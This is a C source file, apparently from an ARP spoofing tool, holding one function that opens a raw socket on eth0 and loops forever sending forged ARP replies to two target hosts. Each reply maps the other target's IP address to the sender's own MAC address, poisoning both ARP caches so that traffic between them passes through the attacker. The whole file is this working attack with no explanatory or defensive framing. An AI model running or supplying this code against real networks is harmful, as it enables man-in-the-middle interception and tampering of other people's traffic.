#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include "kh_ca.h"


void ARP_send_reply()
{
  extern char my_mac_addr_char[20];
  extern char my_ip_addr_char[20];
  extern char target_mac_addr_char[20];
  extern int my_mac_addr_int[6];
  extern int my_ip_addr_int[4];
  extern int target_mac_addr_int[2][6];
  extern char *target_ip_addr_char[2];
  char gData[ sizeof( ethdr ) + sizeof( arphdr ) ];

  int i, j, k, sock = 0;
  struct sockaddr_ll sll;

  ethdr         eth;
  arphdr        arp;

  bzero( &sll, sizeof( sll ) );
  sll.sll_family = PF_PACKET;
  sll.sll_ifindex = if_nametoindex( "eth0" );
  sll.sll_halen = 6;

  sock = socket( PF_PACKET, SOCK_RAW, 0 );

  while( 1 ) {

    for( i = 0; i < 2; i++) {

      if( i == 0 )      { j = 1; }
      else if( i == 1 ) { j = 0; }

      eth.dst[0] = target_mac_addr_int[i][0];
      eth.dst[1] = target_mac_addr_int[i][1];
      eth.dst[2] = target_mac_addr_int[i][2];
      eth.dst[3] = target_mac_addr_int[i][3];
      eth.dst[4] = target_mac_addr_int[i][4];
      eth.dst[5] = target_mac_addr_int[i][5];
      eth.src[0] = my_mac_addr_int[0];
      eth.src[1] = my_mac_addr_int[1];
      eth.src[2] = my_mac_addr_int[2];
      eth.src[3] = my_mac_addr_int[3];
      eth.src[4] = my_mac_addr_int[4];
      eth.src[5] = my_mac_addr_int[5];
      eth.type = htons( 0x0806 );

      arp.hwtype = htons( 0x0001 );
      arp.prtype = htons( 0x0800 );
      arp.hwsize = 0x06;
      arp.prsize = 0x04;
      arp.opcode = htons( 0x0002 );
      arp.sender_mac_addr[0] = my_mac_addr_int[0];
      arp.sender_mac_addr[1] = my_mac_addr_int[1];
      arp.sender_mac_addr[2] = my_mac_addr_int[2];
      arp.sender_mac_addr[3] = my_mac_addr_int[3];
      arp.sender_mac_addr[4] = my_mac_addr_int[4];
      arp.sender_mac_addr[5] = my_mac_addr_int[5];
      arp.sender_ip_addr = inet_addr( target_ip_addr_char[j] );
      arp.target_mac_addr[0] = target_mac_addr_int[i][0];
      arp.target_mac_addr[1] = target_mac_addr_int[i][1];
      arp.target_mac_addr[2] = target_mac_addr_int[i][2];
      arp.target_mac_addr[3] = target_mac_addr_int[i][3];
      arp.target_mac_addr[4] = target_mac_addr_int[i][4];
      arp.target_mac_addr[5] = target_mac_addr_int[i][5];
      arp.target_ip_addr = inet_addr( target_ip_addr_char[i] );

      memcpy( gData, &eth, sizeof( eth ) );
      memcpy( gData + sizeof( eth ), &arp, sizeof( arp ) );

      sendto( sock, gData, sizeof( eth ) + sizeof( arp ),
               0, (struct sockaddr *)&sll, sizeof( sll ) );
    }

    sleep(1);
  }
}
